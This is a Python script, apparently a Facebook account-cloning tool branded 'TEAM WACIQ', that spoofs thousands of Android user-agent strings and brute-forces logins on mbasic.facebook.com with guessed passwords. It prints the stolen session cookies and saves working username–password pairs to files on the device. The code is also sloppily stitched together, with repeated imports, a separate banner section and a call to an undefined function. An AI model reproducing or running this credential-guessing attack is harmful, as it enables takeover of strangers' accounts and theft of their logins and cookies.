from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
    os.system('pkg install espeak')
P = '\x1b[1;97m' # 
M = '\033[1;33m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;96m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
id = []
user = []
oks = []
cps = []
loop = 0
ugen=[]
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    d=random.randrange(10,200)
    e='0.4844.88 '
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for xd in range(9000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(10000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      aJaber=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(aJaber)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	alhhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(alhhaj)
import os
import sys
import time
import random
import shutil

# رنګونه
R = "\033[1;31m"  # سور
G = "\033[1;32m"  # شین
Y = "\033[1;33m"  # ژیړ
B = "\033[1;34m"  # آبي
M = "\033[1;35m"  # بنفشي
C = "\033[1;36m"  # فیروزه‌یي
W = "\033[1;37m"  # سپین
RESET = "\033[0m"

# تالندي (Lightning) افکت
def lightning_effect(duration=3, width=60):
    chars = [' ', '.', '*', '^', '⚡', '•', ' ']
    end_time = time.time() + duration
    while time.time() < end_time:
        line = ''.join(random.choice(chars) for _ in range(width))
        sys.stdout.write('\r' + random.choice([Y, C, W, B]) + line + RESET)
        sys.stdout.flush()
        time.sleep(0.05)
        sys.stdout.write('\r' + ' ' * width + '\r')
        sys.stdout.flush()

# ASCII لوگو
def show_logo():
    logo_art = [
        f"{Y}██╗    ██╗ █████╗  ██████╗██╗ ██████╗   ",
        f"{Y}██║    ██║██╔══██╗██╔════╝██║██╔═══██╗  ",
        f"{Y}██║ █╗ ██║███████║██║     ██║██║   ██║  ",
        f"{Y}██║███╗██║██╔══██║██║     ██║██║   ██║  ",
        f"{Y}╚███╔███╔╝██║  ██║╚██████╗██║╚██████╔╝  ",
        f"{Y} ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝╚═╝ ╚═════╝   {RESET}"
    ]
    cols = shutil.get_terminal_size().columns
    for line in logo_art:
        print(line.center(cols))
        time.sleep(0.05)

    # ځلا افکت
    for _ in range(3):
        print(f"{B}{'⚡ WACIQ ⚡'.center(cols)}{RESET}")
        time.sleep(0.3)
        print(" ".center(cols))
        time.sleep(0.3)

# ښکلی معلوماتي بکس
def show_info_box():
    box = f"""
{R}┏━━━━━━━━━━━━━━━━━━━{G}TEAM WACIQ{R}━━━━━━━━━━━━━━━━━━━━┓
{R}┃{W} 🧠 NAME         : {C}JABER                                 {R}┃
{R}┃{W} 🌐 FACEBOOK     : {C}JABER x JABER ARMY                    {R}┃
{R}┃{W} 💻 GITHUB       : {C}JxT-ARMY                              {R}┃
{R}┃{W} 🌍 RELIGION     : {C}BANGLADESHI                           {R}┃
{R}┃{W} 📱 WHATSAPP     : {C}+8801852192547                        {R}┃
{R}┃{W} 🧩 TOOL NAME    : {C}R4NDOM-CLONING                        {R}┃
{R}┃{W} 🔓 TOOL STATUS  : {G}FREE                                  {R}┃
{R}┗━━━━━━━━━━━━━━━━━━━{M}⚡ POWERED BY WACIQ ⚡{R}━━━━━━━━━━━━━━┛{RESET}
"""
    print(box)

# اصلي اجرای کود
if __name__ == "__main__":
    os.system('clear')
    lightning_effect(duration=3, width=70)
    show_logo()
    show_info_box()
    print(f"\n{C}✨ Welcome to the Future of WACIQ Tools ✨{RESET}\n") 
def Jaberm(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;91m[\033[1;92mՏᎬᎪᎡᏟᎻᏆΝᏀ\033[1;91m]🤭[\033[1;92m%s\033[1;91m]😜[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92mJABER-BD\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;35m'+coki)
                open('/sdcard/JABER-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[JABER-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
                open('/sdcard/JABER-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass
 
Jaber()
